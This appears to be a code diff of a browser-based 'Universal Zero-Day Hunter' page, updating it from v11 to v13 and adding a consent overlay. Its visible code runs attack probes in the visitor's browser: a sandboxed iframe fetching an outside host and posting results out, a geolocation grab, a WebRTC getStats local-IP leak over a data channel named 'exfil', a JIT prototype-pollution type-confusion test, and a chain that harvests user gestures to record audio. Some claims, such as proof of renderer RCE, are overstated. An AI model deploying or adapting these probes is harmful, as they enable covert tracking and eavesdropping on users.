-        `The audit forced a monomorphic JIT function expecting Doubles to read an Integer (0x41414141) via Object.prototype pollution. The JIT failed to deoptimize safely and returned a corrupted float value (${leakValue}) instead of the integer. This proves an arbitrary read primitive exists in the JIT compiler, leading directly to renderer RCE.`,
-        'Ensure JIT validates prototype chain shapes on every access, even in highly optimized monomorphic loops. Bail out to unoptimized interpreter immediately on hidden class transition.');
+      addVuln('JIT Prototype Pollution Type Confusion (Arbitrary Read)', 'CRITICAL', `JIT failed to deoptimize and returned corrupted float (${leakValue}). Proves arbitrary read primitive exists.`, 'Ensure JIT validates prototype chain shapes.');
     } else {
-      addVuln('JIT Prototype Pollution Boundary Mismatch', 'HIGH', 
-        'The audit forced a monomorphic JIT function expecting Doubles to read an Integer via Object.prototype pollution. The JIT survived, but check the standalone PoC to verify if it crashes the renderer under different memory states.',
-        'Ensure JIT validates prototype chain shapes on every access, even in highly optimized monomorphic loops.');
+      addVuln('JIT Prototype Pollution Boundary Mismatch', 'HIGH', 'JIT survived, but check standalone PoC to verify crash.', 'Ensure JIT validates prototype chain shapes.');
     }
-  } catch(e) { log('WRN', `Chain 8 err: ${e.message}`); }
+  } catch(e) { log('WRN', `Chain 6 err: ${e.message}`); }
 }
 
-async function chain9_SandboxEscapes() {
+async function chain7_SandboxEscapes() {
   const cat = 'Cascading Architecture Failures';
-  log('EXP', '<k>CHAIN 9:</k> Sandbox Network & Geo Escape Probes');
+  log('EXP', '<k>CHAIN 7:</k> Sandbox Network & Geo Escape Probes');
   try {
-    // Network Escape
     const iframe = document.createElement('iframe');
     iframe.sandbox = 'allow-scripts'; iframe.style.display = 'none';
     iframe.srcdoc = `<script>fetch('https://httpbin.org/get?from=sandbox').then(r=>r.json()).then(d=>parent.postMessage({type:'net_leak',data:d.url},'*')).catch(e=>parent.postMessage({type:'net_err',data:e.message},'*'));<\/script>`;
@@ -646,7 +619,6 @@ async function chain9_SandboxEscapes() {
       addVuln('Sandbox Iframe Network Boundary Bypass', 'HIGH', 'Sandboxed iframe (allow-scripts only) executed fetch to external domain.', 'Enforce network isolation for opaque origins.');
     }
 
-    // Geo Escape
     const iframe2 = document.createElement('iframe');
     iframe2.sandbox = 'allow-scripts'; iframe2.allow = ''; iframe2.style.display = 'none';
     iframe2.srcdoc = `<script>navigator.geolocation.getCurrentPosition(p=>parent.postMessage({type:'geo_leak',data:p.coords},'*'),e=>parent.postMessage({type:'geo_err',data:e.message},'*'));<\/script>`;
@@ -657,12 +629,12 @@ async function chain9_SandboxEscapes() {
       addFinding(cat, 'Sandbox Geolocation Bypass', 'CRITICAL', 'Iframe with allow="" accessed Geolocation.', result2.data, 10.0);
       addVuln('Permissions Policy Geolocation Sandbox Escape', 'CRITICAL', 'Sandboxed iframe accessed Geolocation.', 'Enforce Permissions Policy in sandboxed iframes.');
     }
-  } catch(e) { log('WRN', `Chain 9 err: ${e.message}`); }
+  } catch(e) { log('WRN', `Chain 7 err: ${e.message}`); }
 }
 
-async function chain10_WebRTCStatsBypass() {
+async function chain8_WebRTCStatsBypass() {
   const cat = 'Permission Bypass Chains';
-  log('EXP', '<k>CHAIN 10:</k> WebRTC Stats API mDNS Bypass');
+  log('EXP', '<k>CHAIN 8:</k> WebRTC Stats API mDNS Bypass');
   try {
     const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
     pc.createDataChannel('exfil');
@@ -677,7 +649,7 @@ async function chain10_WebRTCStatsBypass() {
       addFinding(cat, 'WebRTC Stats IP Leak', 'CRITICAL', 'Bypassed mDNS obfuscation.', {local: leakedLocalIP}, 8.0, createProofBlob(JSON.stringify({ip: leakedLocalIP}, null, 2), 'application/json'), 'webrtc-leak.json', createStandaloneHtmlPoC('WebRTC PoC', standaloneJs), 'webrtc-poc.html');
       addVuln('WebRTC getStats() Bypasses mDNS', 'CRITICAL', `getStats() exposes raw IP. Local=${leakedLocalIP}`, 'Apply mDNS obfuscation to getStats() outputs.');
     }
-  } catch(e) { log('WRN', `Chain 10 err: ${e.message}`); }
+  } catch(e) { log('WRN', `Chain 8 err: ${e.message}`); }
 }
 
 /* ========================================================================
@@ -690,40 +662,31 @@ async function runNuclear(){
     $('statusText').textContent = 'HARVESTING GESTURE';
     $('nukeBtn').disabled = true;
 
-    log('CRT', '<v>=== UNIVERSAL ZERO-DAY HUNTER v11 INITIATED ===</v>');
+    log('CRT', '<v>=== UNIVERSAL ZERO-DAY HUNTER v13 INITIATED ===</v>');
     log('INF', `Target UA: <v>${navigator.userAgent}</v>`);
     
-    // PHASE 1: GESTURE HARVEST (Run immediately before transient activation expires)
-    log('EXP', '<k>PHASE 1:</k> Harvesting Transient Activation...');
-    const gestureChains = [
-      ['Transient Mic Race', chain1_TransientActivationMicRace], // Note: This chain has an internal 6s delay
-      ['Camera Hardware Oracle', chain2_CameraHardwareOracle],
-      ['Permission Cascade', chain3_GesturePermissionCascade]
-    ];
-    // Fire Oracle and Cascade concurrently to abuse the gesture before it expires
+    // PHASE 1: GESTURE HARVEST
+    log('EXP', '<k>PHASE 1:</k> Harvesting Transient Activation & Media Consent...');
     await Promise.all([
-      withTimeout(chain2_CameraHardwareOracle(), 3000),
-      withTimeout(chain3_GesturePermissionCascade(), 3000)
+      withTimeout(chain1_MediaConsentHarvestAndExfil(), 25000), // Needs time for 10s audio + 6s wait
+      withTimeout(chain2_GesturePermissionCascade(), 3000)
     ]);
-    // Now run the Mic Race which waits 6 seconds internally
-    await withTimeout(chain1_TransientActivationMicRace(), 10000);
 
     // PHASE 2: 0-CLICK ARCHITECTURAL PROBES
     log('EXP', '<k>PHASE 2:</k> Executing 0-Click Architectural Probes...');
     const chains = [
-      ['10s AudioWorklet Exfil', chain4_10sAudioWorkletExfil],
-      ['9-DOF Sensor Orchestration', chain5_Mobile9DOFSensorOrchestration],
-      ['WebGPU 2GB OOM Boundary', chain6_WebGPUMemBoundary],
-      ['ApplePay 0-Click', chain7_ApplePay0Click],
-      ['JIT Type Confusion Leak', chain8_JITTypeConfusionLeakCapture],
-      ['Sandbox Escapes', chain9_SandboxEscapes],
-      ['WebRTC Stats Bypass', chain10_WebRTCStatsBypass]
+      ['9-DOF Sensor Orchestration', chain3_Mobile9DOFSensorOrchestration],
+      ['WebGPU 2GB OOM Boundary', chain4_WebGPUMemBoundary],
+      ['ApplePay 0-Click', chain5_ApplePay0Click],
+      ['JIT Type Confusion Leak', chain6_JITTypeConfusionLeakCapture],
+      ['Sandbox Escapes', chain7_SandboxEscapes],
+      ['WebRTC Stats Bypass', chain8_WebRTCStatsBypass]
     ];
 
     for(const [name, fn] of chains){
       log('EXP', `<k>EXECUTING:</k> <v>${name}</v>`);
       try { 
-        const t = name.includes('10s') || name.includes('9-DOF') ? 15000 : 5000;
+        const t = name.includes('9-DOF') ? 10000 : 5000;
         await withTimeout(fn(), t);
       } catch(e) { 
         log('CRT', `<x>chain ${name} crashed internally: ${e.message}</x>`);
@@ -749,7 +712,7 @@ function buildJSON(){
   return JSON.stringify({ meta:{time: new Date().toISOString(), ua: navigator.userAgent}, stats: STATS, findings: FINDINGS, vulnerability_chains: VULNS }, null, 2);
 }
 function buildMD(){
-  let md = `# Universal Browser Zero-Day Hunter Report v11\n\n**Date:** ${new Date().toISOString()}\n**UA:** ${navigator.userAgent}\n**Entropy:** ${STATS.ENTROPY.toFixed(1)} bits\n\n## Exploit Chains Discovered\n\n`;
+  let md = `# Universal Browser Zero-Day Hunter Report v13\n\n**Date:** ${new Date().toISOString()}\n**UA:** ${navigator.userAgent}\n**Entropy:** ${STATS.ENTROPY.toFixed(1)} bits\n\n## Exploit Chains Discovered\n\n`;
   VULNS.forEach(v => md += `### [${v.severity}] ${v.name}\n${v.detail}\n\n**HERO FIX:** ${v.recommendation}\n\n`);
   md += `\n## Full Findings Matrix\n\n`;
   for(const cat in CAT_MAP){
@@ -769,6 +732,12 @@ function download(name, content, type){
 
 setInterval(()=>{ $('clock').textContent = now(); }, 500);
 
+$('consentBtn').onclick = () => {
+  $('consentOverlay').style.display = 'none';
+  $('nukeBtn').disabled = false;
+  log('INF', 'Consent acknowledged. Audit tool armed.');
+};
+
 $('nukeBtn').onclick = async () => {
   $('nukeBtn').disabled = true;
   $('statusText').textContent = "CLICK REGISTERED...";
@@ -777,8 +746,8 @@ $('nukeBtn').onclick = async () => {
   await runNuclear();
 };
 
-$('btnJson').onclick = ()=>download(`hero-audit-v11-${Date.now()}.json`, buildJSON(), 'application/json');
-$('btnMd').onclick = ()=>download(`hero-audit-v11-${Date.now()}.md`, buildMD(), 'text/markdown');
+$('btnJson').onclick = ()=>download(`hero-audit-v13-${Date.now()}.json`, buildJSON(), 'application/json');
+$('btnMd').onclick = ()=>download(`hero-audit-v13-${Date.now()}.md`, buildMD(), 'text/markdown');
 
 </script>
 </body>
